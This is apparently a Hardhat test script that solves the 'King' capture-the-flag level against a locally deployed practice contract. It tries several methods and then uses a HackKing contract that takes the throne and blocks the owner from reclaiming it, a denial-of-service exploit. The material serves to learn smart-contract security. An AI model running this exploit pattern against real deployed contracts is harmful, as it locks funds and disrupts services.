const { expect } = require("chai");
const { ethers } = require("hardhat");
const { consoleLogTitleH1, consoleLogMessage } = require("./utils.js");

describe("King", function () {
  let deployer;
  let hacker;
  let tester;

  it("Should not allow Hack.sol to transfer the ether back to the HackKing.sol", async function () {
    consoleLogTitleH1("Level 9 - King");

    // 🔨 Addresses
    [deployer, hacker, tester] = await ethers.getSigners();

    // 📗 Contract to be hacked
    const Contract = await ethers.getContractFactory("King", deployer);
    const contract = await Contract.connect(deployer).deploy();
    await contract.deployed();

    // Send some ether to the contract as the owner of it to start with the ponzi!
    let txSendTransaction = await deployer.sendTransaction({
      to: contract.address,
      value: ethers.utils.parseEther("0.000001"),
    });
    await txSendTransaction.wait((confirms = 1));

    // 📕 Deploy the contract that will execute the hack
    const HackKing = await ethers.getContractFactory("HackKing", hacker);
    const hackKing = await HackKing.connect(hacker).deploy(contract.address);
    await hackKing.deployed();

    // 👿 Hacking the contract
    // 🗣 Logging status
    let king = await contract._king();
    let prize = await contract.prize();
    prize = ethers.utils.formatEther(prize);
    consoleLogMessage("👑 Initial king:", king);
    consoleLogMessage("💰 Initial prize:", prize, " ether\n");

    // 👉 Send ether as EOA to HackKing contract ❌
    if (false) {
      txSendTransaction = await hacker.sendTransaction({
        to: contract.address,
        value: ethers.utils.parseEther(prize),
      });
      await txSendTransaction.wait((confirms = 1));

      // 🗣 Logging status
      king = await contract._king();
      prize = await contract.prize();
      prize = ethers.utils.formatEther(prize);
      consoleLogMessage("👑 Current king:", king);
      consoleLogMessage("💰 Current prize:", prize, " ether\n");

      // ✅ Check if the hack was successful
      expect(king).to.be.eq(hacker.address);
    }

    // 📕 Execute the hack with
    // selfdestruct(. . .)  ❌ - not calling receive
    // sendEther(. . .)     ❌ - not enough gas when executing receive
    // transferEther(. . .) ❌ - not enough gas when executing receive
    if (false) {
      const txCallValue = await hackKing.selfDestructEther({
        value: ethers.utils.parseEther(prize),
        // gasLimit: 1000000,
      });
      await txCallValue.wait((confirms = 1));

      // 🗣 Logging status
      king = await contract._king();
      prize = await contract.prize();
      prize = ethers.utils.formatEther(prize);
      consoleLogMessage("👑 Current king:", king);
      consoleLogMessage("💰 Current prize:", prize, " ether\n");

      // ✅ Check if the hack was successful
      expect(king).to.be.eq(hackKing.address);
    }

    // 📕 Execute the hack with callValueEther(_kingAddress)  ✅
    if (true) {
      const txCallValue = await hackKing.callValueEther({
        value: ethers.utils.parseEther(prize),
        gasLimit: 1000000,
      });
      await txCallValue.wait((confirms = 1));

      // 🗣 Logging status
      king = await contract._king();
      prize = await contract.prize();
      prize = ethers.utils.formatEther(prize);
      consoleLogMessage("👑 Current king:", king);
      consoleLogMessage("💰 Current prize:", prize, " ether\n");

      // ✅ Check if the hack was successful
      expect(king).to.be.eq(hackKing.address);

      // Send some ether to the contract as the owner of it to start with the ponzi!
      try {
        txSendTransaction = await deployer.sendTransaction({
          to: contract.address,
          value: ethers.utils.parseEther("0.5"),
          gasLimit: 10000000,
        });

        txSendTransaction = await txSendTransaction.wait((confirms = 1));
      } catch (e) {
        expect(e).to.match(
          /.*(Error: Transaction reverted: function selector was not recognized and there's no fallback nor receive function|Error: Transaction reverted without a reason string).*/gi
        );
      }
    }
  });
});
